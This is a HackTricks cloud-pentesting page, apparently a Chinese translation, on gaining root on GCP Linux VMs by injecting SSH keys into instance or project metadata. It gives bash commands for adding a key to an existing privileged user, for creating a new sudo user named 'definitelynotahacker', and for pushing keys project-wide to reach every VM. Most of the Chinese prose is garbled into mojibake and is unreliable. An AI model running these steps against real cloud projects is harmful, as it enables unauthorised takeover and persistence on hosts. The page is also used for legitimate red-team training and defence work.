# GCP - æ·»åŠ è‡ªå®šä¹‰ SSH å…ƒæ•°æ®

## GCP - æ·»åŠ è‡ªå®šä¹‰ SSH å…ƒæ•°æ®

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

### ä¿®æ”¹å…ƒæ•°æ® <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

å¯¹å®ä¾‹çš„å…ƒæ•°æ®ä¿®æ”¹å¯èƒ½å¯¼è‡´ **å¦‚æœæ”»å‡»è€…è·å¾—å¿…è¦æƒé™ï¼Œå°†ä¼šå¸¦æ¥é‡å¤§å®‰å…¨é£é™©**ã€‚

#### **å°† SSH å¯†é’¥çº³å…¥è‡ªå®šä¹‰å…ƒæ•°æ®**

åœ¨ GCP ä¸Šï¼Œ**Linux ç³»ç»Ÿ** é€šå¸¸ä¼šä» [Google Compute Engine çš„ Python Linux å®¢æˆ·ç¯å¢ƒ](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) æ‰§è¡Œè„šæœ¬ã€‚å…¶å…³é”®ç»„ä»¶æ˜¯ [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ï¼Œæ—¨åœ¨ **å®šæœŸæ£€æŸ¥** å®ä¾‹å…ƒæ•°æ®ç«¯ç‚¹ä»¥è·å– **æˆæƒ SSH å…¬é’¥çš„æ›´æ–°**ã€‚

å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿä¿®æ”¹è‡ªå®šä¹‰å…ƒæ•°æ®ï¼Œä»–å¯ä»¥ä½¿å®ˆæŠ¤è¿›ç¨‹æ‰¾åˆ°ä¸€ä¸ªæ–°çš„å…¬é’¥ï¼Œè¯¥å…¬é’¥å°†è¢«å¤„ç†å¹¶ **é›†æˆåˆ°æœ¬åœ°ç³»ç»Ÿä¸­**ã€‚è¯¥å¯†é’¥å°†è¢«æ·»åŠ åˆ° **ç°æœ‰ç”¨æˆ·çš„ `~/.ssh/authorized_keys` æ–‡ä»¶ä¸­ï¼Œæˆ–è€…æ ¹æ®å¯†é’¥çš„æ ¼å¼å¯èƒ½åˆ›å»ºä¸€ä¸ªå…·æœ‰ `sudo` æƒé™çš„æ–°ç”¨æˆ·**ã€‚æ”»å‡»è€…å°†èƒ½å¤Ÿæ”»é™·ä¸»æœºã€‚

#### **å°† SSH å¯†é’¥æ·»åŠ åˆ°ç°æœ‰ç‰¹æƒç”¨æˆ·**

1. **æ£€æŸ¥å®ä¾‹ä¸Šçš„ç°æœ‰ SSH å¯†é’¥ï¼š**
*   æ‰§è¡Œå‘½ä»¤ä»¥æè¿°å®ä¾‹åŠå…¶å…ƒæ•°æ®ï¼Œä»¥å®šä½ç°æœ‰ SSH å¯†é’¥ã€‚è¾“å‡ºä¸­çš„ç›¸å…³éƒ¨åˆ†å°†åœ¨ `metadata` ä¸‹ï¼Œå…·ä½“æ˜¯ `ssh-keys` é”®ã€‚

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* æ³¨æ„ SSH å¯†é’¥çš„æ ¼å¼ï¼šç”¨æˆ·ååœ¨å¯†é’¥ä¹‹å‰ï¼Œç”¨å†’å·åˆ†éš”ã€‚
2. **ä¸º SSH å¯†é’¥å…ƒæ•°æ®å‡†å¤‡æ–‡æœ¬æ–‡ä»¶ï¼š**
* å°†ç”¨æˆ·ååŠå…¶å¯¹åº”çš„ SSH å¯†é’¥çš„è¯¦ç»†ä¿¡æ¯ä¿å­˜åˆ°åä¸º `meta.txt` çš„æ–‡æœ¬æ–‡ä»¶ä¸­ã€‚è¿™å¯¹äºä¿ç•™ç°æœ‰å¯†é’¥å¹¶æ·»åŠ æ–°å¯†é’¥è‡³å…³é‡è¦ã€‚
3. **ä¸ºç›®æ ‡ç”¨æˆ·ï¼ˆæœ¬ä¾‹ä¸­çš„ `alice`ï¼‰ç”Ÿæˆæ–°çš„ SSH å¯†é’¥ï¼š**
*   ä½¿ç”¨ `ssh-keygen` å‘½ä»¤ç”Ÿæˆæ–°çš„ SSH å¯†é’¥ï¼Œç¡®ä¿æ³¨é‡Šå­—æ®µï¼ˆ`-C`ï¼‰ä¸ç›®æ ‡ç”¨æˆ·ååŒ¹é…ã€‚

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* å°†æ–°çš„å…¬é’¥æ·»åŠ åˆ° `meta.txt` ä¸­ï¼Œæ¨¡ä»¿å®ä¾‹å…ƒæ•°æ®ä¸­çš„æ ¼å¼ã€‚
4. **æ›´æ–°å®ä¾‹çš„ SSH å¯†é’¥å…ƒæ•°æ®ï¼š**
*   ä½¿ç”¨ `gcloud compute instances add-metadata` å‘½ä»¤å°†æ›´æ–°çš„ SSH å¯†é’¥å…ƒæ•°æ®åº”ç”¨äºå®ä¾‹ã€‚

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **ä½¿ç”¨æ–°çš„ SSH å¯†é’¥è®¿é—®å®ä¾‹ï¼š**
*   ä½¿ç”¨æ–°çš„å¯†é’¥é€šè¿‡ SSH è¿æ¥åˆ°å®ä¾‹ï¼Œä»¥ç›®æ ‡ç”¨æˆ·ï¼ˆæœ¬ä¾‹ä¸­çš„ `alice`ï¼‰çš„èº«ä»½è®¿é—® shellã€‚

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **åˆ›å»ºæ–°ç‰¹æƒç”¨æˆ·å¹¶æ·»åŠ  SSH å¯†é’¥**

å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰è¶£çš„ç”¨æˆ·ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·å¹¶èµ‹äºˆå…¶ `sudo` æƒé™ï¼š
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### SSH keys at project level <a href="#sshing-around" id="sshing-around"></a>

é€šè¿‡**åœ¨é¡¹ç›®çº§åˆ«åº”ç”¨SSHå¯†é’¥**ï¼Œå¯ä»¥æ‰©å¤§SSHè®¿é—®åˆ°äº‘ç¯å¢ƒä¸­çš„å¤šä¸ªè™šæ‹Ÿæœºï¼ˆVMï¼‰ã€‚è¿™ç§æ–¹æ³•å…è®¸å¯¹é¡¹ç›®ä¸­æœªæ˜ç¡®é˜»æ­¢é¡¹ç›®èŒƒå›´å†…SSHå¯†é’¥çš„ä»»ä½•å®ä¾‹è¿›è¡ŒSSHè®¿é—®ã€‚ä»¥ä¸‹æ˜¯ç®€è¦æŒ‡å—ï¼š

1. **åœ¨é¡¹ç›®çº§åˆ«åº”ç”¨SSHå¯†é’¥ï¼š**
*   ä½¿ç”¨`gcloud compute project-info add-metadata`å‘½ä»¤å°†`meta.txt`ä¸­çš„SSHå¯†é’¥æ·»åŠ åˆ°é¡¹ç›®çš„å…ƒæ•°æ®ä¸­ã€‚æ­¤æ“ä½œç¡®ä¿SSHå¯†é’¥åœ¨é¡¹ç›®ä¸­çš„æ‰€æœ‰VMä¸­è¢«è¯†åˆ«ï¼Œé™¤éæŸä¸ªVMå¯ç”¨äº†â€œé˜»æ­¢é¡¹ç›®èŒƒå›´å†…SSHå¯†é’¥â€é€‰é¡¹ã€‚

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **ä½¿ç”¨é¡¹ç›®èŒƒå›´å†…çš„å¯†é’¥SSHè¿›å…¥å®ä¾‹ï¼š**
* åœ¨é¡¹ç›®èŒƒå›´å†…çš„SSHå¯†é’¥åˆ°ä½åï¼Œæ‚¨å¯ä»¥SSHè¿›å…¥é¡¹ç›®ä¸­çš„ä»»ä½•å®ä¾‹ã€‚æœªé˜»æ­¢é¡¹ç›®èŒƒå›´å†…å¯†é’¥çš„å®ä¾‹å°†æ¥å—SSHå¯†é’¥ï¼Œä»è€Œæˆäºˆè®¿é—®æƒé™ã€‚
* SSHè¿›å…¥å®ä¾‹çš„ç›´æ¥æ–¹æ³•æ˜¯ä½¿ç”¨`gcloud compute ssh [INSTANCE]`å‘½ä»¤ã€‚æ­¤å‘½ä»¤ä½¿ç”¨æ‚¨å½“å‰çš„ç”¨æˆ·åå’Œåœ¨é¡¹ç›®çº§åˆ«è®¾ç½®çš„SSHå¯†é’¥å°è¯•è®¿é—®ã€‚

## References

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
